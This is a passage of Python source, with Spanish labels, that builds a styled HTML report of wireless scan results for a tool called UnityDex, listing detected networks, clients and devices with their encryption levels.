                    color: var(--primary-color);
                    font-size: 1.5rem;
                }}
                
                .stats {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                    gap: 20px;
                    margin-bottom: 20px;
                }}
                
                .stat-card {{
                    background-color: white;
                    border-radius: var(--border-radius);
                    padding: 20px;
                    box-shadow: var(--box-shadow);
                    border-top: 4px solid var(--primary-color);
                    transition: all 0.3s ease;
                }}
                
                .stat-card:hover {{
                    transform: translateY(-5px);
                    box-shadow: 0 6px 12px rgba(0,0,0,0.15);
                }}
                
                .stat-card h3 {{
                    margin-top: 0;
                    color: var(--primary-color);
                    font-size: 1.2rem;
                    border-bottom: 1px solid #eee;
                    padding-bottom: 10px;
                    margin-bottom: 15px;
                }}
                
                .stat-card p {{
                    margin: 8px 0;
                }}
                
                .network-grid, .client-grid, .device-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
                    gap: 20px;
                    margin-top: 20px;
                }}
                
                .network-card, .client-card, .device-card {{
                    background-color: white;
                    border-radius: var(--border-radius);
                    padding: 20px;
                    box-shadow: var(--box-shadow);
                    transition: all 0.3s ease;
                }}
                
                .network-card:hover, .client-card:hover, .device-card:hover {{
                    transform: translateY(-5px);
                    box-shadow: 0 6px 12px rgba(0,0,0,0.15);
                }}
                
                .network-card h3, .client-card h3, .device-card h3 {{
                    margin-top: 0;
                    color: var(--primary-color);
                    font-size: 1.2rem;
                }}
                
                .security-low {{
                    color: var(--danger-color);
                    font-weight: bold;
                }}
                
                .security-medium {{
                    color: var(--warning-color);
                    font-weight: bold;
                }}
                
                .security-high {{
                    color: var(--success-color);
                    font-weight: bold;
                }}
                
                table {{
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 15px;
                    box-shadow: 0 2px 3px rgba(0,0,0,0.1);
                    border-radius: var(--border-radius);
                    overflow: hidden;
                }}
                
                th, td {{
                    padding: 12px 15px;
                    text-align: left;
                }}
                
                th {{
                    background-color: var(--primary-color);
                    color: white;
                    font-weight: 600;
                    text-transform: uppercase;
                    font-size: 0.85rem;
                    letter-spacing: 0.5px;
                }}
                
                tr:nth-child(even) {{
                    background-color: #f8f9fa;
                }}
                
                tr:hover {{
                    background-color: #e9ecef;
                }}
                
                .wpa2 {{
                    background-color: rgba(40, 167, 69, 0.1);
                }}
                
                .wpa {{
                    background-color: rgba(255, 193, 7, 0.1);
                }}
                
                .open {{
                    background-color: rgba(220, 53, 69, 0.1);
                }}
                
                .chart-container {{
                    height: 300px;
                    margin: 20px 0;
                }}
                
                .security-badge {{
                    display: inline-block;
                    padding: 5px 10px;
                    border-radius: 20px;
                    font-size: 0.8rem;
                    font-weight: bold;
                    text-align: center;
                    margin-right: 5px;
                }}
                
                .badge-high {{
                    background-color: var(--success-color);
                    color: white;
                }}
                
                .badge-medium {{
                    background-color: var(--warning-color);
                    color: white;
                }}
                
                .badge-low {{
                    background-color: var(--danger-color);
                    color: white;
                }}
                
                .footer {{
                    text-align: center;
                    margin-top: 30px;
                    padding: 20px;
                    color: #6c757d;
                    font-size: 0.9rem;
                }}
                
                @media (max-width: 768px) {{
                    .stats {{
                        grid-template-columns: 1fr;
                    }}
                    
                    .header h1 {{
                        font-size: 1.8rem;
                    }}
                    
                    .section {{
                        padding: 15px;
                    }}
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Reporte de Escaneo Inalámbrico - UnityDex</h1>
                    <p>Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                </div>
                
                <div class="section">
                    <h2>Información General</h2>
                    <div class="stats">
                        <div class="stat-card">
                            <h3>Detalles del Escaneo</h3>
                            <p><strong>Interfaz:</strong> {results['interface']}</p>
                            <p><strong>Sistema Operativo:</strong> {results['os_type']}</p>
                            <p><strong>Inicio:</strong> {results['start_time']}</p>
                            <p><strong>Fin:</strong> {results['end_time']}</p>
                            <p><strong>Duración:</strong> {results['duration']:.2f} segundos</p>
                        </div>
                        <div class="stat-card">
                            <h3>Resumen</h3>
                            <p><strong>Redes encontradas:</strong> {len(results['networks'])}</p>
                            <p><strong>Clientes encontrados:</strong> {len(results['clients'])}</p>
                            <p><strong>Dispositivos detectados:</strong> {len(results.get('detected_devices', {}))}</p>
                        </div>
        '''
        
        # Añadir estadísticas de seguridad si están disponibles con visualización mejorada
        if results.get('security_analysis') and results.get('security_stats'):
            stats = results['security_stats']
            html += f'''
                        <div class="stat-card">
                            <h3>Estadísticas de Seguridad</h3>
                            <p>
                                <strong>Nivel de Seguridad:</strong> 
                                <span class="security-badge badge-low">{stats['low_security_count']} Baja</span>
                                <span class="security-badge badge-medium">{stats['medium_security_count']} Media</span>
                                <span class="security-badge badge-high">{stats['high_security_count']} Alta</span>
                            </p>
                            <p><strong>Redes Abiertas:</strong> {stats['open_networks_count']}</p>
                            <p><strong>Redes WEP:</strong> {stats['wep_networks_count']}</p>
                            <p><strong>Redes WPA:</strong> {stats['wpa_networks_count']}</p>
                            <p><strong>Redes WPA2:</strong> {stats['wpa2_networks_count']}</p>
                            
                            <div class="chart-container">
                                <div id="security-chart" style="height: 100%; width: 100%;"></div>
                            </div>
                            <script>
                                // Datos para el gráfico de seguridad
                                const securityData = [
                                    {{'y': {stats['high_security_count']}, 'label': "Alta", 'color': "#27ae60"}},
                                    {{'y': {stats['medium_security_count']}, 'label': "Media", 'color': "#f39c12"}},
                                    {{'y': {stats['low_security_count']}, 'label': "Baja", 'color': "#e74c3c"}}
                                ];
                                
                                // Datos para el gráfico de tipos de encriptación
                                const encryptionData = [
                                    {{'y': {stats['open_networks_count']}, 'label': "Abierta", 'color': "#e74c3c"}},
                                    {{'y': {stats['wep_networks_count']}, 'label': "WEP", 'color': "#f39c12"}},
                                    {{'y': {stats['wpa_networks_count']}, 'label': "WPA", 'color': "#3498db"}},
                                    {{'y': {stats['wpa2_networks_count']}, 'label': "WPA2", 'color': "#27ae60"}}
                                ];
                                
                                // Función para crear gráficos simples con barras HTML
                                function createSimpleBarChart(data, containerId) {{
                                    const container = document.getElementById(containerId);
                                    const total = data.reduce((sum, item) => sum + item.y, 0);
                                    
                                    if (total === 0) {{
                                        container.innerHTML = '<div style="text-align: center; padding: 20px;">No hay datos suficientes para mostrar el gráfico</div>';
                                        return;
                                    }}
                                    
                                    let html = '<div style="display: flex; height: 100%; align-items: flex-end; padding-bottom: 30px; position: relative;">';
                                    
                                    // Crear barras
                                    data.forEach(item => {{
                                        const percentage = (item.y / total) * 100;
                                        html += `
                                            <div style="flex: 1; margin: 0 5px; display: flex; flex-direction: column; align-items: center;">
                                                <div style="background-color: ${{item.color}}; width: 80%; height: ${{percentage}}%; min-height: 20px; border-radius: 5px 5px 0 0;"></div>
                                                <div style="margin-top: 10px; text-align: center; font-weight: bold;">${{item.label}}</div>
                                                <div style="margin-top: 5px; text-align: center;">${{item.y}}</div>
                                            </div>
                                        `;
                                    }});
                                    
                                    html += '</div>';
                                    container.innerHTML = html;
                                }}
                                
                                // Crear gráfico cuando se cargue la página
                                window.onload = function() {{
                                    createSimpleBarChart(securityData, 'security-chart');
                                }};
                            </script>
                        </div>
            '''
        
        html += '''
                    </div>
                </div>
        '''
        
        # Sección de redes con diseño mejorado
        html += '''
                <div class="section">
                    <h2>Redes Detectadas</h2>
                    <div class="table-responsive">
                        <table>
                            <thead>
                                <tr>
                                    <th>#</th>
                                    <th>BSSID</th>
                                    <th>ESSID</th>
                                    <th>Canal</th>
                                    <th>Señal</th>
                                    <th>Seguridad</th>
                                    <th>Detalles</th>
                                </tr>
                            </thead>
                            <tbody>
        '''
        
        # Añadir filas para cada red con mejor visualización
        for i, network in enumerate(results['networks'], 1):
            # Determinar clase y badge de seguridad
            row_class = ""
            security_badge = ""
            encryption = network.get('encryption', '').lower()
            
            if 'wpa2' in encryption:
                row_class = "wpa2"
                security_badge = "<span class='security-badge badge-high'>WPA2</span>"
            elif 'wpa' in encryption:
                row_class = "wpa"
                security_badge = "<span class='security-badge badge-medium'>WPA</span>"
            elif 'wep' in encryption:
                row_class = "open"
                security_badge = "<span class='security-badge badge-low'>WEP</span>"
            elif encryption in ['off', 'open', ''] or not encryption:
                row_class = "open"
                security_badge = "<span class='security-badge badge-low'>Abierta</span>"
            else:
                security_badge = f"<span class='security-badge badge-medium'>{encryption}</span>"
            
            # Calcular la intensidad de la señal como barras visuales
            signal_strength = network.get('signal', 0)
            if isinstance(signal_strength, str):
                try:
                    # Intentar convertir a número si es una cadena
                    signal_strength = int(signal_strength.replace('%', '').replace('dBm', '').strip())
                except:
                    signal_strength = 0
            
            # Normalizar la señal (asumiendo que está en dBm o porcentaje)
            if signal_strength < 0:  # Si es dBm (-100 a 0)
                signal_percent = min(100, max(0, (100 + signal_strength) * 2))
            else:  # Si es porcentaje (0-100)
                signal_percent = min(100, max(0, signal_strength))
            
            # Crear barras de señal
            signal_bars = f'''
                <div class="signal-bars" title="{signal_strength}">
                    <div class="signal-bar" style="width: {signal_percent}%; background: linear-gradient(to right, #e74c3c, #f39c12, #27ae60);"></div>
                </div>
                <span>{signal_strength}</span>
            '''
            
            # Detalles de seguridad
            security_details = f'''
                <div class="security-details">
                    <p><strong>Cifrado:</strong> {network.get('cipher', 'N/A')}</p>
                    <p><strong>Autenticación:</strong> {network.get('authentication', 'N/A')}</p>
                </div>
            '''
            
            html += f'''
                            <tr class="{row_class}">
                                <td>{i}</td>
                                <td><code>{network.get('bssid', 'N/A')}</code></td>
                                <td><strong>{network.get('essid', 'N/A')}</strong></td>
                                <td>{network.get('channel', 'N/A')}</td>
                                <td>{signal_bars}</td>
                                <td>{security_badge}</td>
                                <td>{security_details}</td>
                            </tr>
            '''
        
        html += '''
                            </tbody>
                        </table>
                    </div>
                    
                    <style>
                        .table-responsive {
                            overflow-x: auto;
                            margin-bottom: 20px;
                        }
                        .signal-bars {
                            width: 100%;
                            height: 8px;
                            background-color: #eee;
                            border-radius: 4px;
                            overflow: hidden;
                            margin-bottom: 5px;
                        }
                        .signal-bar {
                            height: 100%;
                            border-radius: 4px;
                        }
                        .security-details {
                            font-size: 0.85rem;
                        }
                        code {
                            font-family: monospace;
                            background-color: #f8f9fa;
                            padding: 2px 4px;
                            border-radius: 3px;
                            font-size: 0.9em;
                        }
                    </style>
                </div>
        '''
        
        # Sección de clientes con diseño mejorado
        if results['clients']:
            html += '''
                <div class="section">
                    <h2>Clientes Detectados</h2>
                    <div class="card-container">
            '''
            
            for i, client in enumerate(results['clients'], 1):
                # Determinar si está asociado a una red
                associated = client.get('bssid', 'N/A') != 'N/A'
                card_class = "client-card" + (" associated" if associated else " unassociated")
                
                # Obtener información de paquetes para visualización
                packets = client.get('packets', 0)
                if isinstance(packets, str):
                    try:
                        packets = int(packets)
                    except:
                        packets = 0
                
                # Crear indicador visual de actividad basado en paquetes
                activity_level = "low"
                if packets > 100:
                    activity_level = "high"
                elif packets > 20:
                    activity_level = "medium"
                
                html += f'''
                    <div class="{card_class}">
                        <div class="client-header">
                            <span class="client-number">{i}</span>
                            <span class="activity-indicator {activity_level}" title="Nivel de actividad: {activity_level.capitalize()}"></span>
                        </div>
                        <div class="client-body">
                            <div class="client-info">
                                <p><strong>MAC:</strong> <code>{client.get('mac', 'N/A')}</code></p>
                                <p><strong>Paquetes:</strong> <span class="packets">{packets}</span></p>
                            </div>
                            <div class="client-association">
                                <p><strong>Red Asociada:</strong></p>
                                <p class="network-name">{client.get('essid', 'No asociado')}</p>
                                <p class="bssid">{client.get('bssid', '')}</p>
                            </div>
                        </div>
                    </div>
                '''
            
            html += '''
                    </div>
                </div>
                
                <style>
                    .card-container {
                        display: grid;
                        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
                        gap: 15px;
                        margin-top: 20px;
                    }
                    .client-card {
                        background-color: #fff;
                        border-radius: 8px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                        overflow: hidden;
                        transition: transform 0.2s, box-shadow 0.2s;
                    }
                    .client-card:hover {
                        transform: translateY(-5px);
                        box-shadow: 0 5px 15px rgba(0,0,0,0.15);
                    }
                    .client-card.associated {
                        border-left: 4px solid #27ae60;
                    }
                    .client-card.unassociated {
                        border-left: 4px solid #e74c3c;
                    }
                    .client-header {
                        padding: 10px 15px;
                        background-color: #f8f9fa;
                        border-bottom: 1px solid #eee;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                    }
                    .client-number {
                        font-weight: bold;
                        color: #555;
                    }
                    .activity-indicator {
                        width: 12px;
                        height: 12px;
                        border-radius: 50%;
                        display: inline-block;
                    }
                    .activity-indicator.low {
                        background-color: #3498db;
                    }
                    .activity-indicator.medium {
                        background-color: #f39c12;
                    }
                    .activity-indicator.high {
                        background-color: #e74c3c;
                    }
                    .client-body {
                        padding: 15px;
                    }
                    .client-info, .client-association {
                        margin-bottom: 10px;
                    }
                    .client-info p, .client-association p {
                        margin: 5px 0;
                    }
                    .network-name {
                        font-weight: 500;
                        color: #2c3e50;
                    }
                    .bssid {
                        font-size: 0.8em;
                        color: #7f8c8d;
                        font-family: monospace;
                    }
                    .packets {
                        font-weight: 500;
                        color: #3498db;
                    }
                </style>
            '''
        
        # Sección de dispositivos conectados con diseño mejorado
        if results.get('detected_devices'):
            html += '''
                <div class="section">
                    <h2>Dispositivos Conectados</h2>
                    <div class="device-container">
            '''
            
            for i, (mac, device) in enumerate(results['detected_devices'].items(), 1):
                # Determinar tipo de dispositivo para icono
                vendor = device.get('vendor', '').lower()
                device_type = "unknown"
                
                # Intentar determinar el tipo de dispositivo basado en el fabricante
                if any(keyword in vendor for keyword in ['apple', 'iphone', 'ipad', 'macbook']):
                    device_type = "apple"
                elif any(keyword in vendor for keyword in ['samsung', 'android', 'huawei', 'xiaomi', 'oppo', 'vivo']):
                    device_type = "android"
                elif any(keyword in vendor for keyword in ['intel', 'amd', 'dell', 'hp', 'lenovo', 'asus']):
                    device_type = "computer"
                elif any(keyword in vendor for keyword in ['cisco', 'netgear', 'tp-link', 'zyxel', 'router', 'switch']):
                    device_type = "router"
                
                # Obtener información de paquetes para visualización
                packets = device.get('packets', 0)
                if isinstance(packets, str):
                    try:
                        packets = int(packets)
                    except:
                        packets = 0
                
                # Crear indicador de actividad
                activity_level = "low"
                if packets > 1000:
                    activity_level = "high"
                elif packets > 100:
                    activity_level = "medium"
                
                html += f'''
                    <div class="device-card device-{device_type}">
                        <div class="device-header">
                            <div class="device-icon {device_type}"></div>
                            <span class="device-number">{i}</span>
                            <span class="activity-badge {activity_level}">{activity_level.capitalize()}</span>
                        </div>
                        <div class="device-body">
                            <h3 class="device-title">Dispositivo {i}</h3>
                            <div class="device-info">
                                <div class="info-row">
                                    <span class="info-label">MAC:</span>
                                    <span class="info-value"><code>{mac}</code></span>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">IP:</span>
                                    <span class="info-value">{device.get('ip', 'N/A')}</span>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">Fabricante:</span>
                                    <span class="info-value vendor-name">{device.get('vendor', 'Desconocido')}</span>
                                </div>
                                <div class="info-row">
                                    <span class="info-label">Actividad:</span>
                                    <span class="info-value">
                                        <div class="packet-bar">
                                            <div class="packet-progress" style="width: {min(100, packets/10)}%"></div>
                                        </div>
                                        <span class="packet-count">{packets} paquetes</span>
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                '''
            
            html += '''
                    </div>
                </div>
                
                <style>
                    .device-container {
                        display: grid;
                        grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
                        gap: 20px;
                        margin-top: 20px;
                    }
                    .device-card {
                        background-color: #fff;
                        border-radius: 10px;
                        box-shadow: 0 3px 12px rgba(0,0,0,0.12);
                        overflow: hidden;
                        transition: all 0.3s ease;
                        position: relative;
                    }
                    .device-card:hover {
                        transform: translateY(-5px);
                        box-shadow: 0 8px 20px rgba(0,0,0,0.2);
                    }
                    .device-header {
                        padding: 15px;
                        background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
                        color: white;
                        position: relative;
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                    }
                    .device-icon {
                        width: 30px;
                        height: 30px;
                        background-size: contain;
                        background-repeat: no-repeat;
                        background-position: center;
                        filter: brightness(0) invert(1);
                    }
                    .device-icon.apple {
                        background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/></svg>');
                    }
                    .device-icon.android {
                        background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M420.55,301.93a24,24,0,1,1,24-24,24,24,0,0,1-24,24m-265.1,0a24,24,0,1,1,24-24,24,24,0,0,1-24,24m273.7-144.48,47.94-83a10,10,0,1,0-17.27-10h0l-48.54,84.07a301.25,301.25,0,0,0-246.56,0L116.18,64.45a10,10,0,1,0-17.27,10h0l47.94,83C64.53,202.22,8.24,285.55,0,384H576c-8.24-98.45-64.54-181.78-146.85-226.55"/></svg>');
                    }
                    .device-icon.computer {
                        background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M128 96h384v256h64V80C576 53.63 554.4 32 528 32h-416C85.63 32 64 53.63 64 80V352h64V96zM624 384h-608C7.25 384 0 391.3 0 400V416c0 35.25 28.75 64 64 64h512c35.25 0 64-28.75 64-64v-16C640 391.3 632.8 384 624 384zM365.9 286.2C369.8 290.1 374.9 292 380 292s10.23-1.938 14.14-5.844l48-48c7.812-7.813 7.812-20.5 0-28.31l-48-48c-7.812-7.813-20.47-7.813-28.28 0c-7.812 7.813-7.812 20.5 0 28.31l33.86 33.84l-33.86 33.84C358 265.7 358 278.4 365.9 286.2zM274.1 286.2c3.906 3.906 9.023 5.844 14.14 5.844s10.23-1.938 14.14-5.844c7.812-7.813 7.812-20.5 0-28.31l-33.86-33.84l33.86-33.84c7.812-7.813 7.812-20.5 0-28.31c-7.812-7.813-20.47-7.813-28.28 0l-48 48c-7.812 7.813-7.812 20.5 0 28.31L274.1 286.2z"/></svg>');
                    }
                    .device-icon.router {
                        background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M624 384h-608C7.25 384 0 391.3 0 400V416c0 35.25 28.75 64 64 64h512c35.25 0 64-28.75 64-64v-16C640 391.3 632.8 384 624 384zM512 96H128v192h384V96zM320 336c-17.62 0-32-14.38-32-32s14.38-32 32-32s32 14.38 32 32S337.6 336 320 336zM496 208h-352v-64h352V208zM240 416c-8.875 0-16-7.125-16-16s7.125-16 16-16s16 7.125 16 16S248.9 416 240 416zM304 416c-8.875 0-16-7.125-16-16s7.125-16 16-16s16 7.125 16 16S312.9 416 304 416zM368 416c-8.875 0-16-7.125-16-16s7.125-16 16-16s16 7.125 16 16S376.9 416 368 416z"/></svg>');
                    }
                    .device-icon.unknown {
                        background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 400c-18 0-32-14-32-32s13.1-32 32-32c17.1 0 32 14 32 32S273.1 400 256 400zM325.1 258L280 286V288c0 13-11 24-24 24S232 301 232 288V272c0-8 4-16 12-21l57-34C308 213 312 206 312 198C312 186 301.1 176 289.1 176h-51.1C225.1 176 216 186 216 198c0 13-11 24-24 24s-24-11-24-24C168 159 199 128 237.1 128h51.1C329 128 360 159 360 198C360 222 347 245 325.1 258z"/></svg>');
                    }
                    .device-number {
                        font-weight: bold;
                        font-size: 1.2em;
                    }
                    .activity-badge {
                        padding: 3px 8px;
                        border-radius: 12px;
                        font-size: 0.7em;
                        font-weight: bold;
                        text-transform: uppercase;
                    }
                    .activity-badge.low {
                        background-color: #3498db;
                    }
                    .activity-badge.medium {
                        background-color: #f39c12;
                    }
                    .activity-badge.high {
                        background-color: #e74c3c;
                    }
                    .device-body {
                        padding: 15px;
                    }
                    .device-title {
                        margin-top: 0;
                        margin-bottom: 15px;
                        color: #2c3e50;
                        font-size: 1.2em;
                    }
                    .device-info {
                        display: flex;
                        flex-direction: column;
                        gap: 10px;
                    }
                    .info-row {
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                    }
                    .info-label {
                        font-weight: bold;
                        color: #7f8c8d;
                        flex: 0 0 30%;
                    }
                    .info-value {
                        flex: 0 0 65%;
                        text-align: right;
                    }
                    .vendor-name {
                        font-weight: 500;
                        color: #2c3e50;
                    }
                    .packet-bar {
                        height: 6px;
                        background-color: #ecf0f1;
                        border-radius: 3px;
                        overflow: hidden;
                        margin-bottom: 5px;
                    }
                    .packet-progress {
                        height: 100%;
                        background: linear-gradient(to right, #3498db, #2ecc71);
                        border-radius: 3px;
                    }
                    .packet-count {
                        font-size: 0.8em;
                        color: #7f8c8d;
                    }
                    
                    /* Estilos específicos para tipos de dispositivos */
                    .device-apple .device-header {
                        background: linear-gradient(135deg, #5D5D5D 0%, #000000 100%);
                    }
                    .device-android .device-header {
                        background: linear-gradient(135deg, #a4c639 0%, #6b8e23 100%);
                    }
                    .device-computer .device-header {
                        background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
                    }
                    .device-router .device-header {
                        background: linear-gradient(135deg, #e67e22 0%, #d35400 100%);
                    }
                    .device-unknown .device-header {
                        background: linear-gradient(135deg, #95a5a6 0%, #7f8c8d 100%);
                    }
                </style>
            '''
        
        # Sección de análisis de seguridad mejorada
        if results.get('security_analysis') and results.get('security_results'):
            html += '''
                <div class="section security-analysis-section">
                    <h2>Análisis de Seguridad</h2>
                    <div class="security-cards">
            '''
            
            for bssid, security in results['security_results'].items():
                # Buscar el ESSID correspondiente al BSSID
                essid = 'Desconocido'
                encryption = ''
                for network in results['networks']:
                    if network.get('bssid') == bssid:
                        essid = network.get('essid', 'Sin nombre')
                        encryption = network.get('encryption', '')
                        break
                
                # Determinar clase y badge de seguridad
                security_class = ''
                security_badge = ''
                security_icon = ''
                
                if security['level'] == 'Alta':
                    security_class = 'security-high'
                    security_badge = '<span class="security-badge high">Alta Seguridad</span>'
                    security_icon = '''
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="security-icon high">
                            <path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.7 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0z"/>
                        </svg>
                    '''
                elif security['level'] == 'Media':
                    security_class = 'security-medium'
                    security_badge = '<span class="security-badge medium">Seguridad Media</span>'
                    security_icon = '''
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="security-icon medium">
                            <path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.7 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0z"/>
                        </svg>
                    '''
                else:  # Baja
                    security_class = 'security-low'
                    security_badge = '<span class="security-badge low">Seguridad Baja</span>'
                    security_icon = '''
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="security-icon low">
                            <path d="M256 0c4.6 0 9.2 1 13.4 2.9L457.7 82.8c22 9.3 38.4 31 38.3 57.2c-.5 99.2-41.3 280.7-213.7 363.2c-16.7 8-36.1 8-52.8 0C57.3 420.7 16.5 239.2 16 140c-.1-26.2 16.3-47.9 38.3-57.2L242.7 2.9C246.8 1 251.4 0 256 0z"/>
                        </svg>
                    '''
                
                # Formatear vulnerabilidades con mejor estilo
                vulnerabilities_html = ''
                if security.get('vulnerabilities'):
                    vulnerabilities_html = '<div class="vulnerabilities">'
                    for vuln in security.get('vulnerabilities', []):
                        vulnerabilities_html += f'''
                            <div class="vulnerability-item">
                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="vuln-icon">
                                    <path d="M256 32c14.2 0 27.3 7.5 34.5 19.8l216 368c7.3 12.4 7.3 27.7 .2 40.1S486.3 480 472 480H40c-14.3 0-27.6-7.7-34.7-20.1s-7-27.8 .2-40.1l216-368C228.7 39.5 241.8 32 256 32zm0 128c-13.3 0-24 10.7-24 24V296c0 13.3 10.7 24 24 24s24-10.7 24-24V184c0-13.3-10.7-24-24-24zm32 224a32 32 0 1 0 -64 0 32 32 0 1 0 64 0z"/>
                                </svg>
                                <span class="vuln-text">{vuln}</span>
                            </div>
                        '''
                    vulnerabilities_html += '</div>'
                else:
                    vulnerabilities_html = '<p class="no-vulnerabilities">No se detectaron vulnerabilidades</p>'
                
                # Crear tarjeta de seguridad
                html += f'''
                    <div class="security-card {security_class}">
                        <div class="security-card-header">
                            {security_icon}
                            <div class="network-info">
                                <h3 class="network-name">{essid}</h3>
                                <code class="network-bssid">{bssid}</code>
                                <div class="encryption-type">{encryption}</div>
                            </div>
                            {security_badge}
                        </div>
                        <div class="security-card-body">
                            <h4>Vulnerabilidades Detectadas:</h4>
                            {vulnerabilities_html}
                        </div>
                    </div>
                '''
            
            html += '''
                    </div>
                </div>
                
                <style>
                    .security-analysis-section {
                        margin-top: 30px;
                    }
                    .security-cards {
                        display: grid;
                        grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
                        gap: 20px;
                        margin-top: 20px;
                    }
                    .security-card {
                        background-color: #fff;
                        border-radius: 10px;
                        box-shadow: 0 3px 15px rgba(0,0,0,0.1);
                        overflow: hidden;
                        transition: transform 0.3s, box-shadow 0.3s;
                    }
                    .security-card:hover {
                        transform: translateY(-5px);
                        box-shadow: 0 8px 25px rgba(0,0,0,0.15);
                    }
                    .security-card.security-high {
                        border-top: 5px solid #27ae60;
                    }
                    .security-card.security-medium {
                        border-top: 5px solid #f39c12;
                    }
                    .security-card.security-low {
                        border-top: 5px solid #e74c3c;
                    }
                    .security-card-header {
                        padding: 15px;
                        display: flex;
                        align-items: center;
                        border-bottom: 1px solid #f1f1f1;
                        position: relative;
                    }
                    .security-icon {
                        width: 30px;
                        height: 30px;
                        margin-right: 15px;
                    }
                    .security-icon.high {
                        fill: #27ae60;
                    }
                    .security-icon.medium {
                        fill: #f39c12;
                    }
                    .security-icon.low {
                        fill: #e74c3c;
                    }
                    .network-info {
                        flex-grow: 1;
                    }
                    .network-name {
                        margin: 0 0 5px 0;
                        font-size: 1.1em;
                        color: #2c3e50;
                    }
                    .network-bssid {
                        display: block;
                        font-size: 0.8em;
                        color: #7f8c8d;
                        margin-bottom: 5px;
                    }
                    .encryption-type {
                        font-size: 0.85em;
                        color: #34495e;
                        font-weight: 500;
                    }
                    .security-badge {
                        padding: 5px 10px;
                        border-radius: 15px;
                        font-size: 0.7em;
                        font-weight: bold;
                        color: white;
                        position: absolute;
                        top: 15px;
                        right: 15px;
                    }
                    .security-badge.high {
                        background-color: #27ae60;
                    }
                    .security-badge.medium {
                        background-color: #f39c12;
                    }
                    .security-badge.low {
                        background-color: #e74c3c;
                    }
                    .security-card-body {
                        padding: 15px;
                    }
                    .security-card-body h4 {
                        margin-top: 0;
                        margin-bottom: 15px;
                        color: #34495e;
                        font-size: 1em;
                    }
                    .vulnerabilities {
                        display: flex;
                        flex-direction: column;
                        gap: 10px;
                    }
                    .vulnerability-item {
                        display: flex;
                        align-items: flex-start;
                        padding: 8px 12px;
                        background-color: #f8f9fa;
                        border-radius: 6px;
                    }
                    .vuln-icon {
                        width: 16px;
                        height: 16px;
                        margin-right: 10px;
                        margin-top: 2px;
                        fill: #e74c3c;
                    }
                    .vuln-text {
                        font-size: 0.9em;
                        color: #34495e;
                        line-height: 1.4;
                    }
                    .no-vulnerabilities {
                        color: #7f8c8d;
                        font-style: italic;
                        text-align: center;
                        padding: 10px;
                        background-color: #f8f9fa;
                        border-radius: 6px;
                    }
                </style>
            '''
        
        # Cerrar HTML
        html += '''
            </div>
        </body>
        </html>
        '''
        
        return html
        
    def generate_report(self, output_file=None, format='txt'):
        '''
        Genera un informe del escaneo
        
        Args:
            output_file (str, optional): Ruta del archivo de salida. Si no se especifica, se genera automáticamente.
            format (str, optional): Formato de salida ('txt' o 'html'). Por defecto es 'txt'.
            
        Returns:
            bool: True si se generó el informe correctamente, False en caso contrario.
        '''
        if not output_file:
            # Generar nombre de archivo por defecto
            if not self.output_dir:
                self.output_dir = 'results'
            
            if not os.path.exists(self.output_dir):
                try:
                    os.makedirs(self.output_dir)
                except Exception as e:
                    logger.error(f"Error al crear directorio de salida: {str(e)}")
                    return False
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            output_file = os.path.join(self.output_dir, f"wireless_report_{timestamp}.{format}")
        
        # Obtener resultados
        results = self.get_results()
        
        try:
            if format.lower() == 'txt':
                with open(output_file, 'w', encoding='utf-8') as f:
